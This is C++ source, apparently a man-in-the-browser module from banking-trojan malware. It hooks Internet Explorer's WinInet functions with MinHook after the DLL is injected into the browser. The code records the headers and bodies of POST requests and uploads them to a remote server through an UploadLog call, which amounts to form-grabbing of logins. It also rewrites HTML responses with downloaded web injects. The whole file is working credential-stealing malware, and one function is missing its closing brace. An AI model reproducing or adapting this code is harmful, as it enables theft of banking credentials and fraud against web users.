#include "..\Common.h"
#include "..\MinHook\include\MinHook.h"
#include "BrowserUtils.h"
#include "WebInjects.h"
#include "..\Utils.h"
#include <WinInet.h>

struct Request
{
   char     *host;
   char     *path;
   char     *buffer;
   BOOL      post;
   BOOL      postSent;
   char     *postData;
   DWORD     postDataSize;
   HINTERNET hInternet;
   DWORD     bufferSize;
   BOOL      replace;
   BOOL      isRead;
   DWORD     sent;
   AiList   *injects;
};

static Request          g_requests[MAX_REQUESTS] = { 0 };                            // keeps track of all requests being made
static CRITICAL_SECTION g_critSec;                                                   // used to manage threads

static BOOL (__stdcall *Real_InternetReadFile)(LPVOID hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
static BOOL (__stdcall *Real_HttpSendRequestW)(LPVOID hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
static LPVOID (__stdcall *Real_InternetConnectW)(LPVOID hInternet, LPCWSTR lpszServerName, WORD nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
static LPVOID (__stdcall *Real_HttpOpenRequestW)(LPVOID hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
static BOOL (__stdcall *Real_InternetQueryDataAvailable)(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
static BOOL (__stdcall *Real_InternetCloseHandle)(HINTERNET hInternet);
static BOOL (__stdcall *Real_InternetReadFileEx)(HINTERNET hFile, LPINTERNET_BUFFERS lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext);
static BOOL (__stdcall *Real_InternetWriteFile) (HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);


// saves the handle returned by InternetConnectW function and host
static void AddRequest(PVOID hInternet, PCHAR host)
{
   Funcs::pEnterCriticalSection(&g_critSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)                                           // searches for an empty request, adds a new one
   {
      if(!g_requests[i].hInternet)
      {
         g_requests[i].hInternet = hInternet;
         g_requests[i].host      = host;
         break;
      }
   }
   Funcs::pLeaveCriticalSection(&g_critSec);
}

static void RemoveRequest(void* hInternet)
{
   Funcs::pEnterCriticalSection(&g_critSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)                                           // searches for an appropriate request, removes it
   {
      if(g_requests[i].hInternet == hInternet)
      {
         Funcs::pFree(g_requests[i].buffer);
         Funcs::pFree(g_requests[i].host);
         Funcs::pFree(g_requests[i].path);
         Funcs::pFree(g_requests[i].postData);
         Funcs::pMemset(&g_requests[i], 0, sizeof(g_requests[i])); 
         break;
      }
   }
   Funcs::pLeaveCriticalSection(&g_critSec);
}

static Request *GetRequest(void* hInternet)
{
   Funcs::pEnterCriticalSection(&g_critSec);
   for(DWORD i = 0; i < MAX_REQUESTS; ++i)                                           // searches for the appropriate request, retrieves it
   {
      if(g_requests[i].hInternet == hInternet)
      {
         Funcs::pLeaveCriticalSection(&g_critSec);
         return &g_requests[i];
      }
   }
   Funcs::pLeaveCriticalSection(&g_critSec);
   return NULL;
}

static BOOL __stdcall My_InternetWriteFile(HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten)
{
   Request *request = GetRequest(hFile);
    // save the data which will be sent
   if(request)
   {
      if(request->post)
      {
         request->postData     = (char *) Alloc(dwNumberOfBytesToWrite);
         Funcs::pMemcpy(request->postData, lpBuffer, dwNumberOfBytesToWrite);
         request->postDataSize = dwNumberOfBytesToWrite;
      }
   }
   // send the data
   return Real_InternetWriteFile(hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten);

static BOOL __stdcall My_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
   // send the request without any changes
   BOOL ret = Real_HttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
   
   // if this is a post request then save the body of the http request
   Request *request = GetRequest(hRequest);
   if(request)
   {
      if(request->post)
      {
         request->postData     = (char *) Alloc(dwOptionalLength);
         Funcs::pMemcpy(request->postData, lpOptional, dwOptionalLength);
         request->postDataSize = dwOptionalLength;
      }
   }
   return ret;
}
 
static HINTERNET __stdcall My_InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
   // establish the connection
   HINTERNET Ret = Real_InternetConnectW(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
   // save the returned handle and host
   if(Ret)
   {
      char *host = Utf16toUtf8((wchar_t *) lpszServerName);
      AddRequest(Ret, host);
   }
   return Ret;
}

static HINTERNET __stdcall My_HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{
   // get the request created in InternetConnect
   Request *request = GetRequest(hConnect);
   // initialize the request
   if(request)
   {
      char *path         = Utf16toUtf8((wchar_t *) lpszObjectName);
      char *lpszVerbA    = Utf16toUtf8((wchar_t *) lpszVerb);
      request->post      = !Funcs::pLstrcmpA(lpszVerbA, Strs::ie1);
      request->path      = path;
      request->injects   = GetWebInject(request->host, path);
      Funcs::pFree(lpszVerbA);
   }
   // get the handle
   HINTERNET ret = Real_HttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
   // remove requst if error happened and replace the old handle with the new one otherwise
   if(!ret)
      RemoveRequest(hConnect);
   else if(request)
      request->hInternet = ret;
   return ret;
}

static BOOL __stdcall My_InternetQueryDataAvailable(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext)
{
   BOOL ret = Real_InternetQueryDataAvailable(hFile, lpdwNumberOfBytesAvailable, dwFlags, dwContext);
   Request *request = GetRequest(hFile);
   // if an inject should be inserted in this request then the function should say that there are some data available
   if(request && request->injects)
      *lpdwNumberOfBytesAvailable = 2048;
   return ret;
}

static BOOL __stdcall My_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)
{
   Request *request = GetRequest(hFile);
   if(request)
   {
      // if this is a post request and data wasn't sent yet
      if(request->post && !request->postSent)
      {
         // copy the headers
         char   *buffer      = NULL;
         DWORD   headersSize = 0;
         Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_FLAG_REQUEST_HEADERS | HTTP_QUERY_RAW_HEADERS_CRLF, buffer, &headersSize, NULL);
         buffer = (char *) Alloc(headersSize + request->postDataSize + 1);
         Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_FLAG_REQUEST_HEADERS | HTTP_QUERY_RAW_HEADERS_CRLF, buffer, &headersSize, NULL);
         Funcs::pMemcpy(buffer + headersSize, request->postData, request->postDataSize);
         buffer[headersSize] = 0;

         // send the url and headers on the server
         BOOL inject;
         char *url = GetUrlHostPath(request->host, request->path, &inject); 
         UploadLog(Strs::ieName, url, buffer, inject); 
         Funcs::pFree(url);
         Funcs::pFree(buffer);
      }
      // if there are some injects
      if(request->injects)
      {
         // while the data is not read
         for(;!request->isRead;)
         {
            // read the data
            BOOL ret = Real_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
            // if the error occured and the data wasn't recieved then wait for 1.5 secs and if the data still wasn't recieved then exit
            if (!ret)
            {
               if(Funcs::pGetLastError() == ERROR_IO_PENDING)
               {
                  //todo: use InternetStatusCallback instead of this hack
                  for(DWORD i = 0; *lpdwNumberOfBytesRead == 0; ++i)
                  {
                     if(i == 15)
                     {
                        RemoveRequest(hFile);
                        return FALSE;
                     }
                     Funcs::pSleep(100);
                  }
               }
               else
               {
                  RemoveRequest(hFile);
                  return FALSE;
               }
            }

            // if the data was recieved
            if(*lpdwNumberOfBytesRead == 0)
            {
               if(request->buffer)
               {
                  // get the beginning of the html document
                  request->buffer[request->bufferSize] = 0;   
                  if(Funcs::pStrStrIA(request->buffer, Strs::ie2))
                  {
                     // insert webinjects
                     ReplaceWebInjects(&request->buffer, request->injects);
                     request->bufferSize = Funcs::pLstrlenA(request->buffer);
                  }
               }
               // mark the data as read
               request->isRead = TRUE;
               break;
            }
            // if the data wasn't recieved but there was no error then leave everything as is
            else
            {
               if(!request->buffer)
                  request->buffer = (char *) Alloc(*lpdwNumberOfBytesRead + 1);
               else
                  request->buffer = (char *) ReAlloc(request->buffer, request->bufferSize + *lpdwNumberOfBytesRead + 1);
               Funcs::pMemcpy(request->buffer + request->bufferSize, lpBuffer, *lpdwNumberOfBytesRead);
               request->bufferSize += *lpdwNumberOfBytesRead;
            }
         }

         // fix the returned values
         DWORD diff = request->bufferSize - request->sent;
         if(diff >= dwNumberOfBytesToRead)
         {
            Funcs::pMemcpy(lpBuffer, request->buffer + request->sent, dwNumberOfBytesToRead);
            *lpdwNumberOfBytesRead = dwNumberOfBytesToRead;
            request->sent += *lpdwNumberOfBytesRead;
         }
         else if(diff > 0)
         {
            Funcs::pMemcpy(lpBuffer, request->buffer + request->sent, diff);
            *lpdwNumberOfBytesRead = diff;
            request->sent += *lpdwNumberOfBytesRead;
         }
         else
         {
            RemoveRequest(hFile);
            *lpdwNumberOfBytesRead = 0;
         }
         return TRUE;
      }
      else
         RemoveRequest(hFile);
   }
   // call the original function without any changes if there are no webinjects
   return Real_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

static BOOL __stdcall My_InternetReadFileEx(HINTERNET hFile, LPINTERNET_BUFFERS lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
{
   // call the original fuction without any changes
   BOOL ret = Real_InternetReadFileEx(hFile, lpBuffersOut, dwFlags, dwContext);
   // remove the request if it wasn't removed earlier
   Request *request = GetRequest(hFile);
   if(request)
      RemoveRequest(hFile);

   // get the headers
   char   *headers      = NULL;
   DWORD   headersSize = 0;
   Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_RAW_HEADERS_CRLF, headers, &headersSize, NULL);
   headers = (char *) Alloc(headersSize + 1);
   Funcs::pHttpQueryInfoA(hFile, HTTP_QUERY_RAW_HEADERS_CRLF, headers, &headersSize, NULL);
   headers[headersSize] = 0;

   char *str    = Strs::ie3; //I hate IE rather hack it then understand it
   DWORD strLen = Funcs::pLstrlenA(str);

   // extract the content type from the header
   char *contentType = FindStrSandwich(headers, Strs::fc8, Strs::winNewLine);
   // if recieved data is html document which is long enough
   if(Funcs::pStrStrIA((char *) lpBuffersOut->lpvBuffer, Strs::ie2) && lpBuffersOut->dwBufferLength >= strLen)
   {
      // replace the content of the document with a strange script. maybe it reloads the page and calls InternetReadFile becaue this function injects nothing
      lpBuffersOut->dwBufferLength = strLen;
      Funcs::pLstrcpyA((char *) lpBuffersOut->lpvBuffer, str);
      Funcs::pFree(headers);
      return TRUE;
   }
   Funcs::pFree(headers);
   return ret;
}

static BOOL __stdcall My_InternetCloseHandle(HINTERNET hInternet)
{
   // remove request when handle is closed
   Request *request = GetRequest(hInternet);
   if(request)
      RemoveRequest(hInternet);
   return Real_InternetCloseHandle(hInternet);
}

// entry point called after dllmain and entrythread when appeared the window of IE (dll injected in iexplorer.exe from dllhost when explorer.exe created this process)
void HookIe()
{
   MH_Initialize();
   // download a config file (json global variable)
   LoadWebInjects();
   Funcs::pInitializeCriticalSection(&g_critSec);
   // hook some functions
   MH_CreateHookApi(Strs::wWininet, Strs::ie4, My_InternetCloseHandle, (LPVOID *) &Real_InternetCloseHandle);
   MH_CreateHookApi(Strs::wWininet, Strs::ie5, My_InternetQueryDataAvailable, (LPVOID *) &Real_InternetQueryDataAvailable);
   MH_CreateHookApi(Strs::wWininet, Strs::ie6, My_HttpOpenRequestW, (LPVOID *) &Real_HttpOpenRequestW);
   MH_CreateHookApi(Strs::wWininet, Strs::ie7, My_InternetConnectW, (LPVOID *) &Real_InternetConnectW);
   MH_CreateHookApi(Strs::wWininet, Strs::ie8, My_HttpSendRequestW, (LPVOID *) &Real_HttpSendRequestW);
   MH_CreateHookApi(Strs::wWininet, Strs::ie9, My_InternetReadFile, (LPVOID *) &Real_InternetReadFile);
   MH_CreateHookApi(Strs::wWininet, Strs::ie10, My_InternetReadFileEx, (LPVOID *) &Real_InternetReadFileEx);
   MH_CreateHookApi(Strs::wWininet, Strs::ie11, My_InternetWriteFile, (LPVOID *) &Real_InternetWriteFile);
   // enable the hooks and leave the function. the thread created during injecting this dll terminates without removing the hooks. also it leaves memory allocted to store the dll unfreed. fortunately the injection happens only once for the whole lifetime of IE therefore the memory leak is not a problem. more noticable leak of memory occures after returning from the restart function in explorer.exe. the amount of unfreed (leaked) memory in exporer.exe increases every time when dllhost.exe process is killed
   MH_EnableHook(MH_ALL_HOOKS);
}
